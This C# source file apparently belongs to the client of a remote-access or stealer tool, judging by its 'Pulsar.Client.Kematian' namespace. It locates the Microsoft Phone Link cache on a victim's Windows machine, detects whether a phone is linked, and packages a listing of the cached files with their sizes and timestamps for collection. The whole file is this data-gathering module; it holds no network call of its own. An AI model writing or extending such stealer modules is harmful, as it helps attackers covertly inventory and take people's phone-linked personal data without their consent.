using System;
using System.Collections.Generic;
using System.IO;
using System.Diagnostics;
using System.Text;

namespace Pulsar.Client.Kematian.PhoneLink
{
    public class PhoneLinkRetriever
    {
        public static string GetPhoneLinkStatus()
        {
            try
            {
                string username = Environment.UserName;
                string phoneLinkPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Packages",
                    "Microsoft.YourPhone_8wekyb3d8bbwe",
                    "LocalCache",
                    "Local",
                    "Microsoft");

                if (!Directory.Exists(phoneLinkPath))
                {
                    return "PhoneLink not installed or directory not found";
                }

                string[] files = Directory.GetFiles(phoneLinkPath, "*", SearchOption.AllDirectories);
                
                if (files.Length == 0)
                {
                    return "PhoneLink installed but no phone is linked";
                }
                
                return $"PhoneLink installed and phone is linked. Found {files.Length} files.";
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error checking PhoneLink status: {ex.Message}");
                return "Error checking PhoneLink status: " + ex.Message;
            }
        }

        public static Dictionary<string, byte[]> GetPhoneLinkFiles()
        {
            Dictionary<string, byte[]> phoneLinkFiles = new Dictionary<string, byte[]>();
            
            try
            {
                string phoneLinkPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Packages",
                    "Microsoft.YourPhone_8wekyb3d8bbwe",
                    "LocalCache",
                    "Local",
                    "Microsoft");

                if (!Directory.Exists(phoneLinkPath))
                {
                    // Create an info file with status
                    phoneLinkFiles["PhoneLink/status.txt"] = Encoding.UTF8.GetBytes("PhoneLink not installed or directory not found");
                    return phoneLinkFiles;
                }

                string[] files = Directory.GetFiles(phoneLinkPath, "*", SearchOption.AllDirectories);
                
                if (files.Length == 0)
                {
                    phoneLinkFiles["PhoneLink/status.txt"] = Encoding.UTF8.GetBytes("PhoneLink installed but no phone is linked");
                    return phoneLinkFiles;
                }

                // Add status file
                phoneLinkFiles["PhoneLink/status.txt"] = Encoding.UTF8.GetBytes($"PhoneLink installed and phone is linked. Found {files.Length} files.");
                
                // Include some limited file information (but not the actual files to keep the data small)
                StringBuilder fileInfo = new StringBuilder();
                foreach (string file in files)
                {
                    try
                    {
                        FileInfo info = new FileInfo(file);
                        string relativePath = file.Replace(phoneLinkPath, "").TrimStart('\\', '/');
                        fileInfo.AppendLine($"File: {relativePath}");
                        fileInfo.AppendLine($"Size: {info.Length} bytes");
                        fileInfo.AppendLine($"Last Modified: {info.LastWriteTime}");
                        fileInfo.AppendLine();
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error getting file info: {ex.Message}");
                    }
                }
                
                phoneLinkFiles["PhoneLink/files_info.txt"] = Encoding.UTF8.GetBytes(fileInfo.ToString());
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error collecting PhoneLink files: {ex.Message}");
                phoneLinkFiles["PhoneLink/error.txt"] = Encoding.UTF8.GetBytes("Error collecting PhoneLink files: " + ex.Message);
            }
            
            return phoneLinkFiles;
        }
    }
} 